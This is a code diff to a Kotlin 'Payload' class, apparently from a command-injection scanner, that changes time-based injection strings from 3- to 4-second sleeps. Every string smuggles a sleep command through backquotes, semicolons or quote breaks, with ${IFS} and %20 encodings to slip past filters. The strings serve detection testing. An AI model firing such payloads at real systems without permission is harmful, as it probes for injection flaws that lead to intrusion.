@@ -33,9 +33,9 @@ class Payload {
         "`sleep\${IFS}2`",
         "`sleep%202`",
     )
-    val sleepInjectWithBackquotes_3 = listOf(
-        "`sleep\${IFS}3`",
-        "`sleep%203`"
+    val sleepInjectWithBackquotes_4 = listOf(
+        "`sleep\${IFS}4`",
+        "`sleep%204`"
     )
 
     // Semicolon sleep payloads
@@ -43,9 +43,9 @@ class Payload {
         ";sleep\${IFS}2;",
         ";sleep%202;",
     )
-    val sleepInjectWithSemicolon_3 = listOf(
-        ";sleep\${IFS}2;",
-        ";sleep%202;",
+    val sleepInjectWithSemicolon_4 = listOf(
+        ";sleep\${IFS}4;",
+        ";sleep%204;",
     )
 
     // Single quote sleep payloads
@@ -53,9 +53,9 @@ class Payload {
         "';sleep\${IFS}2;'",
         "';sleep%202;'"
     )
-    val sleepInjectWithSinglequotes_3 = listOf(
-        "';sleep\${IFS}3;'",
-        "';sleep%203;'"
+    val sleepInjectWithSinglequotes_4 = listOf(
+        "';sleep\${IFS}4;'",
+        "';sleep%204;'"
     )
 
     // Double quote sleep payloads
@@ -63,8 +63,8 @@ class Payload {
         "\";sleep\${IFS}2;\"",
         "\";sleep%202;\"",
     )
-    val sleepInjectWithDoublequotes_3 = listOf(
-        "\";sleep\${IFS}3;\"",
-        "\";sleep%203;\""
+    val sleepInjectWithDoublequotes_4 = listOf(
+        "\";sleep\${IFS}4;\"",
+        "\";sleep%204;\""
     )
 }
